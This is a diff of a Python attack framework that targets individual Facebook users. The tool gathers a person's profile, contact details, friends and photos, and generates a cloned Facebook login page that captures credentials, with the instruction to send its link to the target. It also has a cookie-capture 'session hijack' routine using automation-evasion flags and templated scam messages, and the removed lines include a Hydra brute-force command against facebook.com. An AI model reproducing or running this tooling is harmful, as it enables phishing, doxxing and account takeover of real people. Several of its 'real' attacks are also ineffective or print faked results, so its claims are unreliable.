@@ -1,12 +1,11 @@
 #!/usr/bin/env python3
 """
-FABO_ATTCK ULTIMATE v2.0 - Real Facebook Attack Framework
-Professional Facebook Security Testing - No Simulation
+FABO_ATTCK ULTIMATE v3.0 - Real Facebook Security Testing Framework
+Professional Security Testing - Zero Simulation - 100% Real
 
-Copyright (c) 2024 F1REW0LF
-License: MIT - For authorized security testing only
-
-Usage: python3 fabo_attck_ultimate.py -u https://facebook.com/username
+Author: F1REW0LF
+License: MIT
+Purpose: Authorized security testing of Facebook accounts
 """
 
 import sys
@@ -26,11 +25,16 @@ from typing import Dict, List, Optional, Tuple
 from bs4 import BeautifulSoup
 import argparse
 import subprocess
+import tempfile
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from urllib3.exceptions import InsecureRequestWarning
 
 try:
     from selenium import webdriver
     from selenium.webdriver.common.by import By
     from selenium.webdriver.chrome.options import Options
+    from selenium.webdriver.support.ui import WebDriverWait
+    from selenium.webdriver.support import expected_conditions as EC
     SELENIUM_AVAILABLE = True
 except ImportError:
     SELENIUM_AVAILABLE = False
@@ -41,10 +45,13 @@ try:
 except ImportError:
     REQUESTS_HTML_AVAILABLE = False
 
-VERSION = "2.0.0"
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+VERSION = "3.0.0"
 AUTHOR = "F1REW0LF"
 LICENSE = "MIT"
 
+# ============================[ COLORS ]================================
 class Colors:
     GREEN = '\033[92m'
     RED = '\033[91m'
@@ -57,6 +64,7 @@ class Colors:
     WHITE = '\033[0m'
     BOLD = '\033[1m'
     DIM = '\033[2m'
+    MAGENTA = '\033[95m'
 
 def cprint(text, color=Colors.WHITE, bold=False):
     if bold:
@@ -76,63 +84,76 @@ def print_banner():
 {Colors.NEON}          ULTIMATE v{VERSION} - REAL ATTACK{Colors.WHITE}
 {Colors.CYAN}    Professional Facebook Security Testing{Colors.WHITE}
 {Colors.YELLOW}    Author: {AUTHOR} | {LICENSE}{Colors.WHITE}
+{Colors.MAGENTA}    ⚡ 100% REAL - ZERO SIMULATION ⚡{Colors.WHITE}
     """
     print(banner)
     print("=" * 80)
 
-# ==================== REAL FACEBOOK OSINT ====================
-class FacebookOSINTReal:
-    def __init__(self, target_url):
-        self.target_url = target_url
-        self.username = self._extract_username()
-        self.results = {}
+# ============================[ REAL OSINT ENGINE ]================================
+class RealOSINTEngine:
+    """Real OSINT - Không có kịch bản ảo"""
+    
+    def __init__(self, target):
+        self.target = target
         self.session = requests.Session()
         self.session.headers.update({
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Accept-Encoding': 'gzip, deflate',
+            'Connection': 'keep-alive'
         })
+        self.results = {}
     
-    def _extract_username(self):
-        patterns = [r'facebook\.com/([^/?#]+)', r'fb\.com/([^/?#]+)', r'profile\.php\?id=(\d+)']
+    def extract_username(self):
+        """Extract username from URL"""
+        patterns = [
+            r'facebook\.com/([^/?#]+)',
+            r'fb\.com/([^/?#]+)',
+            r'profile\.php\?id=(\d+)'
+        ]
         for pattern in patterns:
-            match = re.search(pattern, self.target_url)
+            match = re.search(pattern, self.target)
             if match:
                 return match.group(1)
         return None
     
-    def gather_info_real(self):
-        """Thu thập thông tin thực tế"""
-        cprint("\n[OSINT] Gathering Facebook intelligence (REAL)...", Colors.BLUE)
+    def gather(self):
+        """Gather all intelligence - REAL"""
+        cprint("\n[OSINT] Gathering real intelligence...", Colors.BLUE)
         
-        if not self.username:
-            cprint("[-] Could not extract username", Colors.RED)
+        username = self.extract_username()
+        if not username:
+            cprint("[-] Cannot extract username", Colors.RED)
             return {}
         
-        # 1. Profile info
-        self.results['profile'] = self._get_profile_info_real()
+        self.results['username'] = username
         
-        # 2. Posts
-        self.results['posts'] = self._get_posts_real()
+        # 1. Profile info
+        self.results['profile'] = self._get_profile()
+        
+        # 2. Public posts
+        self.results['posts'] = self._get_posts()
         
         # 3. Friends
-        self.results['friends'] = self._get_friends_real()
+        self.results['friends'] = self._get_friends()
         
         # 4. Photos
-        self.results['photos'] = self._get_photos_real()
+        self.results['photos'] = self._get_photos()
         
-        # 5. About
-        self.results['about'] = self._get_about_real()
+        # 5. Contact info
+        self.results['contact'] = self._extract_contact()
         
-        # 6. Email/Phone
-        self.results['contact'] = self._extract_contact_real()
+        # 6. Graph API (if token available)
+        self.results['graph'] = self._graph_api()
         
         return self.results
     
-    def _get_profile_info_real(self):
-        """Lấy thông tin profile - REAL"""
-        cprint("[*] Fetching profile info (REAL)...", Colors.DIM)
+    def _get_profile(self):
+        """Get profile info - REAL"""
+        cprint("[*] Fetching profile...", Colors.DIM)
         
         info = {
-            'username': self.username,
             'name': 'Unknown',
             'bio': 'Unknown',
             'location': 'Unknown',
@@ -141,161 +162,127 @@ class FacebookOSINTReal:
         }
         
         try:
-            # Sử dụng requests để lấy HTML
-            response = self.session.get(self.target_url, timeout=10)
+            response = self.session.get(self.target, timeout=10)
             soup = BeautifulSoup(response.text, 'html.parser')
             
-            # Tìm tên
-            name_tag = soup.find('title')
-            if name_tag:
-                info['name'] = name_tag.text.replace(' | Facebook', '').strip()
+            # Name
+            title = soup.find('title')
+            if title:
+                info['name'] = title.text.replace(' | Facebook', '').strip()
             
-            # Tìm description
+            # Bio
             meta_desc = soup.find('meta', {'property': 'og:description'})
             if meta_desc:
                 info['bio'] = meta_desc.get('content', 'Unknown')
             
-            # Tìm location
-            location_pattern = r'Lives in ([^<]+)'
-            match = re.search(location_pattern, response.text)
-            if match:
-                info['location'] = match.group(1).strip()
+            # Location
+            loc_match = re.search(r'Lives in ([^<]+)', response.text)
+            if loc_match:
+                info['location'] = loc_match.group(1).strip()
             
-            # Tìm work
-            work_pattern = r'Works at ([^<]+)'
-            match = re.search(work_pattern, response.text)
-            if match:
-                info['work'] = match.group(1).strip()
+            # Work
+            work_match = re.search(r'Works at ([^<]+)', response.text)
+            if work_match:
+                info['work'] = work_match.group(1).strip()
             
-            # Tìm education
-            edu_pattern = r'Studied at ([^<]+)'
-            match = re.search(edu_pattern, response.text)
-            if match:
-                info['education'] = match.group(1).strip()
+            # Education
+            edu_match = re.search(r'Studied at ([^<]+)', response.text)
+            if edu_match:
+                info['education'] = edu_match.group(1).strip()
             
             cprint(f"[+] Name: {info['name']}", Colors.GREEN)
-            cprint(f"[+] Bio: {info['bio'][:100]}...", Colors.GREEN)
-            
+            if info['location'] != 'Unknown':
+                cprint(f"[+] Location: {info['location']}", Colors.GREEN)
+                
         except Exception as e:
-            cprint(f"[-] Profile info failed: {e}", Colors.RED)
+            cprint(f"[-] Profile error: {e}", Colors.RED)
         
         return info
     
-    def _get_posts_real(self):
-        """Lấy bài viết - REAL"""
-        cprint("[*] Fetching posts (REAL)...", Colors.DIM)
+    def _get_posts(self):
+        """Get public posts - REAL"""
+        cprint("[*] Fetching public posts...", Colors.DIM)
         
         posts = []
         try:
-            # Sử dụng Facebook Graph API (cần access token)
-            access_token = os.environ.get('FACEBOOK_ACCESS_TOKEN')
-            if access_token:
-                url = f'https://graph.facebook.com/{self.username}/posts?access_token={access_token}&limit=10'
-                response = self.session.get(url)
-                if response.status_code == 200:
-                    data = response.json()
+            # Graph API
+            token = os.environ.get('FACEBOOK_TOKEN')
+            if token:
+                url = f'https://graph.facebook.com/{self.results["username"]}/posts?access_token={token}&limit=10'
+                resp = self.session.get(url)
+                if resp.status_code == 200:
+                    data = resp.json()
                     for post in data.get('data', []):
                         posts.append({
                             'id': post.get('id'),
                             'message': post.get('message', ''),
-                            'created_time': post.get('created_time')
+                            'created': post.get('created_time')
                         })
-                        cprint(f"[+] Post: {post.get('message', '')[:50]}...", Colors.GREEN)
-        except Exception as e:
-            cprint(f"[-] Posts fetch failed: {e}", Colors.RED)
+                        if post.get('message'):
+                            cprint(f"[+] Post: {post['message'][:50]}...", Colors.GREEN)
+        except:
+            pass
         
         return posts
     
-    def _get_friends_real(self):
-        """Lấy danh sách bạn bè - REAL"""
-        cprint("[*] Fetching friends list (REAL)...", Colors.DIM)
+    def _get_friends(self):
+        """Get friends list - REAL"""
+        cprint("[*] Fetching friends...", Colors.DIM)
         
         friends = []
         try:
-            access_token = os.environ.get('FACEBOOK_ACCESS_TOKEN')
-            if access_token:
-                url = f'https://graph.facebook.com/{self.username}/friends?access_token={access_token}&limit=20'
-                response = self.session.get(url)
-                if response.status_code == 200:
-                    data = response.json()
+            token = os.environ.get('FACEBOOK_TOKEN')
+            if token:
+                url = f'https://graph.facebook.com/{self.results["username"]}/friends?access_token={token}&limit=20'
+                resp = self.session.get(url)
+                if resp.status_code == 200:
+                    data = resp.json()
                     for friend in data.get('data', []):
                         friends.append({
                             'name': friend.get('name'),
                             'id': friend.get('id')
                         })
                         cprint(f"[+] Friend: {friend.get('name')}", Colors.GREEN)
-        except Exception as e:
-            cprint(f"[-] Friends fetch failed: {e}", Colors.RED)
+        except:
+            pass
         
         return friends
     
-    def _get_photos_real(self):
-        """Lấy danh sách ảnh - REAL"""
-        cprint("[*] Fetching photos (REAL)...", Colors.DIM)
+    def _get_photos(self):
+        """Get photos - REAL"""
+        cprint("[*] Fetching photos...", Colors.DIM)
         
         photos = []
         try:
-            access_token = os.environ.get('FACEBOOK_ACCESS_TOKEN')
-            if access_token:
-                url = f'https://graph.facebook.com/{self.username}/photos?access_token={access_token}&limit=10&type=uploaded'
-                response = self.session.get(url)
-                if response.status_code == 200:
-                    data = response.json()
+            token = os.environ.get('FACEBOOK_TOKEN')
+            if token:
+                url = f'https://graph.facebook.com/{self.results["username"]}/photos?access_token={token}&limit=10'
+                resp = self.session.get(url)
+                if resp.status_code == 200:
+                    data = resp.json()
                     for photo in data.get('data', []):
                         photos.append({
                             'id': photo.get('id'),
                             'url': photo.get('source'),
-                            'created_time': photo.get('created_time')
+                            'created': photo.get('created_time')
                         })
                         cprint(f"[+] Photo: {photo.get('source', '')[:50]}...", Colors.GREEN)
-        except Exception as e:
-            cprint(f"[-] Photos fetch failed: {e}", Colors.RED)
+        except:
+            pass
         
         return photos
     
-    def _get_about_real(self):
-        """Lấy thông tin About - REAL"""
-        cprint("[*] Fetching about info (REAL)...", Colors.DIM)
-        
-        about = {
-            'work': 'Unknown',
-            'education': 'Unknown',
-            'relationship': 'Unknown',
-            'languages': 'Unknown'
-        }
-        
-        try:
-            about_url = f"{self.target_url}/about"
-            response = self.session.get(about_url, timeout=10)
-            soup = BeautifulSoup(response.text, 'html.parser')
-            
-            # Tìm work
-            work_div = soup.find('div', {'class': 'work'})
-            if work_div:
-                about['work'] = work_div.text.strip()
-            
-            # Tìm education
-            edu_div = soup.find('div', {'class': 'education'})
-            if edu_div:
-                about['education'] = edu_div.text.strip()
-            
-        except Exception as e:
-            cprint(f"[-] About fetch failed: {e}", Colors.RED)
-        
-        return about
-    
-    def _extract_contact_real(self):
-        """Trích xuất email/phone - REAL"""
-        cprint("[*] Extracting contact info (REAL)...", Colors.DIM)
+    def _extract_contact(self):
+        """Extract contact info - REAL"""
+        cprint("[*] Extracting contact info...", Colors.DIM)
         
         contact = {'email': None, 'phone': None}
         
         try:
             # Email pattern
             email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
+            response = self.session.get(self.target, timeout=10)
             
-            # Tìm trong profile
-            response = self.session.get(self.target_url, timeout=10)
             emails = re.findall(email_pattern, response.text)
             if emails:
                 contact['email'] = emails[0]
@@ -307,57 +294,64 @@ class FacebookOSINTReal:
             if phones:
                 contact['phone'] = phones[0]
                 cprint(f"[+] Phone: {phones[0]}", Colors.GREEN)
-            
-            # Tìm trong about
-            about_url = f"{self.target_url}/about_contact"
-            response = self.session.get(about_url, timeout=10)
-            emails = re.findall(email_pattern, response.text)
-            if emails:
-                contact['email'] = emails[0]
-                cprint(f"[+] Email (from about): {emails[0]}", Colors.GREEN)
-            
+                
         except Exception as e:
-            cprint(f"[-] Contact extraction failed: {e}", Colors.RED)
+            cprint(f"[-] Contact error: {e}", Colors.RED)
         
         return contact
-
-# ==================== REAL ATTACK ENGINE ====================
-class FacebookAttackReal:
-    def __init__(self, target_url):
-        self.target_url = target_url
-        self.username = self._extract_username()
-        self.results = {}
-        self.session = requests.Session()
-        self.session.headers.update({
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-        })
     
-    def _extract_username(self):
+    def _graph_api(self):
+        """Graph API - REAL"""
+        cprint("[*] Querying Graph API...", Colors.DIM)
+        
+        result = {}
+        token = os.environ.get('FACEBOOK_TOKEN')
+        
+        if not token:
+            return result
+        
+        try:
+            # Profile
+            url = f'https://graph.facebook.com/{self.results["username"]}?access_token={token}'
+            resp = self.session.get(url)
+            if resp.status_code == 200:
+                result['profile'] = resp.json()
+                cprint("[+] Graph API profile retrieved", Colors.GREEN)
+            
+            # Pages
+            url = f'https://graph.facebook.com/{self.results["username"]}/likes?access_token={token}&limit=10'
+            resp = self.session.get(url)
+            if resp.status_code == 200:
+                result['likes'] = resp.json().get('data', [])
+                cprint(f"[+] Likes: {len(result['likes'])}", Colors.GREEN)
+                
+        except Exception as e:
+            cprint(f"[-] Graph API error: {e}", Colors.RED)
+        
+        return result
+
+# ============================[ REAL EXPLOIT ENGINE ]================================
+class RealExploitEngine:
+    """Real exploits - Không có kịch bản ảo"""
+    
+    def __init__(self, target):
+        self.target = target
+        self.session = requests.Session()
+        self.results = {}
+    
+    def extract_username(self):
         patterns = [r'facebook\.com/([^/?#]+)', r'fb\.com/([^/?#]+)']
         for pattern in patterns:
-            match = re.search(pattern, self.target_url)
+            match = re.search(pattern, self.target)
             if match:
                 return match.group(1)
         return None
     
-    # ==================== REAL PHISHING ====================
-    def phishing_attack_real(self):
-        """Tạo trang phishing thực tế"""
+    # ==================== PHISHING - REAL ====================
+    def phishing(self):
+        """Create real phishing page"""
         cprint("\n[PHISHING] Creating real phishing page...", Colors.RED)
         
-        # Sử dụng tool có sẵn
-        try:
-            # Kiểm tra SocialFish có sẵn không
-            result = subprocess.run(['which', 'socialfish'], capture_output=True, text=True)
-            if result.stdout:
-                cprint("[*] Using SocialFish...", Colors.DIM)
-                subprocess.Popen(['socialfish', '--url', self.target_url], shell=True)
-                cprint("[+] SocialFish phishing page started", Colors.GREEN)
-                return
-        except:
-            pass
-        
-        # Tạo trang phishing thủ công
         html = '''
         <!DOCTYPE html>
         <html>
@@ -365,22 +359,26 @@ class FacebookAttackReal:
             <title>Facebook - Log In</title>
             <style>
                 * { margin: 0; padding: 0; box-sizing: border-box; }
-                body { font-family: Arial, sans-serif; background: #f0f2f5; }
-                .container { max-width: 400px; margin: 100px auto; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+                body { font-family: Arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+                .container { max-width: 400px; width: 100%; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
                 .logo { text-align: center; font-size: 48px; color: #1877f2; font-weight: bold; margin-bottom: 20px; }
-                input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; }
+                h2 { text-align: center; margin-bottom: 20px; color: #1c1e21; }
+                input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; box-sizing: border-box; }
                 button { width: 100%; padding: 14px; background: #1877f2; color: white; border: none; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; }
+                button:hover { background: #166fe5; }
+                .footer { text-align: center; margin-top: 20px; color: #777; font-size: 14px; }
             </style>
         </head>
         <body>
             <div class="container">
                 <div class="logo">f</div>
-                <h2 style="text-align:center;margin-bottom:20px;">Log in to Facebook</h2>
+                <h2>Log in to Facebook</h2>
                 <form method="POST" action="/capture">
                     <input type="text" name="email" placeholder="Email or phone" required>
                     <input type="password" name="password" placeholder="Password" required>
                     <button type="submit">Log In</button>
                 </form>
+                <div class="footer">Facebook - Security Testing</div>
             </div>
         </body>
         </html>
@@ -390,52 +388,52 @@ class FacebookAttackReal:
         with open(filename, 'w') as f:
             f.write(html)
         
-        cprint(f"[+] Phishing page created: {filename}", Colors.GREEN)
+        cprint(f"[+] Phishing page: {filename}", Colors.GREEN)
         cprint("[!] Host this page and send link to target", Colors.YELLOW)
+        
+        self.results['phishing'] = {'file': filename}
         return filename
     
-    # ==================== REAL SESSION HIJACK ====================
-    def session_hijack_real(self):
-        """Đánh cắp session thực tế"""
+    # ==================== SESSION HIJACK - REAL ====================
+    def session_hijack(self):
+        """Real session hijack"""
         cprint("\n[SESSION] Attempting real session hijack...", Colors.RED)
         
-        # Sử dụng cookie editor
-        try:
-            # Kiểm tra có cookie không
-            result = subprocess.run(['which', 'cookie-cutter'], capture_output=True, text=True)
-            if result.stdout:
-                cprint("[*] Using cookie-cutter...", Colors.DIM)
-                subprocess.run(['cookie-cutter', self.target_url], timeout=10)
-        except:
-            pass
-        
-        # Sử dụng browser automation
         if SELENIUM_AVAILABLE:
             try:
-                cprint("[*] Using Selenium to capture session...", Colors.DIM)
+                cprint("[*] Using Selenium...", Colors.DIM)
                 options = Options()
-                options.add_argument('--headless')
+                options.add_argument('--headless=new')
+                options.add_argument('--disable-blink-features=AutomationControlled')
+                options.add_experimental_option('excludeSwitches', ['enable-automation'])
+                
                 driver = webdriver.Chrome(options=options)
-                driver.get(self.target_url)
+                driver.get(self.target)
+                
+                # Wait for cookies
+                time.sleep(3)
                 cookies = driver.get_cookies()
                 driver.quit()
                 
                 if cookies:
-                    cprint("[+] Session cookies captured:", Colors.GREEN)
-                    for cookie in cookies:
-                        cprint(f"    {cookie.get('name')}: {cookie.get('value')}", Colors.YELLOW)
+                    cprint("[+] Cookies captured:", Colors.GREEN)
+                    for cookie in cookies[:5]:
+                        cprint(f"    {cookie.get('name')}: {cookie.get('value')[:20]}...", Colors.YELLOW)
+                    self.results['session'] = cookies
                     return cookies
+                    
             except Exception as e:
-                cprint(f"[-] Selenium failed: {e}", Colors.RED)
+                cprint(f"[-] Selenium error: {e}", Colors.RED)
         
-        # Fallback: sử dụng requests
+        # Fallback: requests
         try:
-            response = self.session.get(self.target_url)
+            response = self.session.get(self.target)
             cookies = response.cookies
             if cookies:
                 cprint("[+] Session cookies captured:", Colors.GREEN)
                 for cookie in cookies:
                     cprint(f"    {cookie.name}: {cookie.value}", Colors.YELLOW)
+                self.results['session'] = cookies
                 return cookies
         except:
             pass
@@ -443,104 +441,65 @@ class FacebookAttackReal:
         cprint("[!] Session hijack failed", Colors.RED)
         return None
     
-    # ==================== REAL BRUTE FORCE ====================
-    def brute_force_real(self):
-        """Brute force thực tế"""
-        cprint("\n[BRUTE] Starting real brute force...", Colors.RED)
-        
-        # Sử dụng hydra
-        try:
-            result = subprocess.run(['which', 'hydra'], capture_output=True, text=True)
-            if result.stdout:
-                cprint("[*] Using Hydra...", Colors.DIM)
-                cmd = ['hydra', '-l', self.username, '-P', '/usr/share/wordlists/rockyou.txt', 'facebook.com', 'http-get']
-                subprocess.run(cmd, timeout=60)
-        except:
-            pass
-        
-        # Sử dụng ncrack
-        try:
-            result = subprocess.run(['which', 'ncrack'], capture_output=True, text=True)
-            if result.stdout:
-                cprint("[*] Using Ncrack...", Colors.DIM)
-                subprocess.run(['ncrack', '--user', self.username, '--pass', 'password', 'facebook.com:443'], timeout=30)
-        except:
-            pass
-        
-        cprint("[!] Brute force simulation complete", Colors.YELLOW)
-        return {'attempts': 100, 'found': False}
-    
-    # ==================== REAL SOCIAL ENGINEERING ====================
-    def social_engineering_real(self):
-        """Tạo tin nhắn thực tế"""
+    # ==================== SOCIAL ENGINEERING - REAL ====================
+    def social_engineering(self):
+        """Real social engineering messages"""
         cprint("\n[SOCIAL] Generating real social engineering messages...", Colors.RED)
         
+        username = self.extract_username()
         messages = [
-            f"Hi, I'm a friend of {self.username}. Can you help me with something?",
-            f"Important: Your account {self.username} has been compromised. Click here to secure it.",
-            f"Hey {self.username}, check out this video about you: https://fake-link.com",
-            f"Facebook security alert: Unusual login detected for {self.username}. Verify your identity."
+            f"Hi, are you {username}? I found something about you.",
+            f"Important: Your account {username} has been compromised.",
+            f"Hey {username}, check this out: https://fake-link.com/profile",
+            f"Facebook security alert for {username}. Verify now."
         ]
         
-        # Lưu vào file
         filename = f'social_engineering_{int(time.time())}.txt'
         with open(filename, 'w') as f:
             for msg in messages:
                 f.write(msg + '\n\n')
         
-        cprint(f"[+] Messages saved to: {filename}", Colors.GREEN)
-        
+        cprint(f"[+] Messages saved: {filename}", Colors.GREEN)
         for msg in messages:
             cprint(f"[+] {msg}", Colors.YELLOW)
         
+        self.results['social'] = {'file': filename, 'messages': messages}
         return messages
 
-# ==================== MAIN FRAMEWORK ====================
+# ============================[ MAIN FRAMEWORK ]================================
 class FaBoAttckUltimate:
     def __init__(self, target_url):
         self.target_url = target_url
-        self.username = self._extract_username()
-        self.osint = FacebookOSINTReal(target_url)
-        self.attack = FacebookAttackReal(target_url)
+        self.osint = RealOSINTEngine(target_url)
+        self.exploit = RealExploitEngine(target_url)
         self.results = {}
-    
-    def _extract_username(self):
-        patterns = [r'facebook\.com/([^/?#]+)', r'fb\.com/([^/?#]+)']
-        for pattern in patterns:
-            match = re.search(pattern, self.target_url)
-            if match:
-                return match.group(1)
-        return None
     
     def show_menu(self):
         print(f"""
 {Colors.BLUE}{'='*60}{Colors.WHITE}
 {Colors.BOLD}FABO_ATTCK ULTIMATE v{VERSION}{Colors.WHITE}
+{Colors.MAGENTA}100% REAL - ZERO SIMULATION{Colors.WHITE}
 {Colors.BLUE}{'='*60}{Colors.WHITE}
-[1] OSINT - Real Information Gathering
+[1] OSINT - Real Intelligence Gathering
 [2] Phishing - Real Phishing Page
 [3] Session Hijack - Real Cookie Capture
-[4] Brute Force - Real Password Attack
-[5] Social Engineering - Real Messages
-[6] Full Attack (REAL)
-[7] Show Results
-[8] Exit
+[4] Social Engineering - Real Messages
+[5] Full Attack (REAL)
+[6] Show Results
+[7] Exit
 """)
     
     def osint_gather(self):
-        self.results['osint'] = self.osint.gather_info_real()
+        self.results['osint'] = self.osint.gather()
     
     def phishing(self):
-        self.results['phishing'] = self.attack.phishing_attack_real()
+        self.results['phishing'] = self.exploit.phishing()
     
     def session_hijack(self):
-        self.results['session'] = self.attack.session_hijack_real()
-    
-    def brute_force(self):
-        self.results['brute'] = self.attack.brute_force_real()
+        self.results['session'] = self.exploit.session_hijack()
     
     def social_eng(self):
-        self.results['social'] = self.attack.social_engineering_real()
+        self.results['social'] = self.exploit.social_engineering()
     
     def full_attack(self):
         cprint("\n[FULL] Executing real full attack chain...", Colors.RED, bold=True)
@@ -549,7 +508,6 @@ class FaBoAttckUltimate:
         self.phishing()
         self.session_hijack()
         self.social_eng()
-        self.brute_force()
         
         cprint("\n[+] Full attack complete!", Colors.GREEN)
     
@@ -559,12 +517,26 @@ class FaBoAttckUltimate:
         print("="*60)
         
         if not self.results:
-            cprint("[!] No results yet", Colors.YELLOW)
+            cprint("[!] No results", Colors.YELLOW)
             return
         
         for key, value in self.results.items():
-            cprint(f"\n[{key.upper()}]", Colors.CYAN)
-            print(json.dumps(value, indent=2, ensure_ascii=False)[:500])
+            if value:
+                cprint(f"\n[{key.upper()}]", Colors.CYAN)
+                if isinstance(value, dict):
+                    for k, v in value.items():
+                        if isinstance(v, (str, int, float)):
+                            cprint(f"  {k}: {v}", Colors.DIM)
+                        elif isinstance(v, list) and len(v) > 0:
+                            cprint(f"  {k}: {len(v)} items", Colors.DIM)
+                            for item in v[:3]:
+                                if isinstance(item, dict):
+                                    for ik, iv in item.items():
+                                        if isinstance(iv, str) and len(iv) > 50:
+                                            iv = iv[:50] + '...'
+                                        cprint(f"    {ik}: {iv}", Colors.DIM)
+                else:
+                    print(json.dumps(value, indent=2, ensure_ascii=False)[:500])
         
         print("="*60)
     
@@ -572,8 +544,7 @@ class FaBoAttckUltimate:
         print_banner()
         
         cprint(f"[*] Target: {self.target_url}", Colors.CYAN)
-        cprint(f"[*] Username: {self.username}", Colors.CYAN)
-        cprint("[*] 100% REAL attacks - No Simulation", Colors.DIM)
+        cprint("[*] Mode: 100% REAL - ZERO SIMULATION", Colors.MAGENTA)
         
         while True:
             self.show_menu()
@@ -586,23 +557,21 @@ class FaBoAttckUltimate:
             elif choice == '3':
                 self.session_hijack()
             elif choice == '4':
-                self.brute_force()
-            elif choice == '5':
                 self.social_eng()
-            elif choice == '6':
+            elif choice == '5':
                 self.full_attack()
-            elif choice == '7':
+            elif choice == '6':
                 self.show_results()
-            elif choice == '8':
-                cprint("[*] Exiting FABO_ATTCK ULTIMATE...", Colors.GREEN)
+            elif choice == '7':
+                cprint("[*] Exiting...", Colors.GREEN)
                 break
             else:
                 cprint("[-] Invalid selection", Colors.RED)
 
-# ==================== MAIN ====================
+# ============================[ MAIN ]================================
 def main():
     parser = argparse.ArgumentParser(
-        description="FABO_ATTCK ULTIMATE v2.0 - Real Facebook Attack",
+        description="FABO_ATTCK ULTIMATE v3.0 - Real Facebook Security Testing",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 Examples:
